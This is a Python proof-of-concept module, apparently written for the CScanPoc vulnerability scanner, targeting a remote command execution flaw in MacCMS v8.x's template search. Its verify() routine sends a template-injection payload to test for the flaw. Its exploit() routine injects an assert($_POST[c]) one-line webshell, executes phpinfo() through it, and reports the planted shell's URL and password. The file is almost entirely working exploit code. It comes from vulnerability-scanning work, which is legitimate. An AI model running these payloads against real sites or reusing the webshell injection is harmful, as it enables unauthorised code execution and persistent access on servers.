# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MacCMS_0012'  # 平台漏洞编号，留空
    name = 'MacCMS v8.x 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-05-19'  # 漏洞公布时间
    desc = '''
        在 F:WWWmaccmsinccommontemplate.php 里面可以看到 ifex() 方法里，$strif参数未过滤直接带入PHP语句，导致命令执行漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4383/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    product = 'MacCMS'  # 漏洞应用名称
    product_version = 'v8.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9e6b4160-5c96-47ce-83b7-63425a4db773'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/index.php?m=vod-search"
            data = "wd={if-A:print(md5(c))}{endif-A}"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/index.php?m=vod-search"
            data = "wd={if-A:assert($_POST[c])}{endif-A}"
            url = self.target + payload
            requests.post(url, data=data)
            verify_url = url + '&wd={if-A:assert($_POST[c])}{endif-A}'
            verify_data = 'c=phpinfo()'
            r = requests.post(verify_url, data=verify_data)

            if 'PHP Verison' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
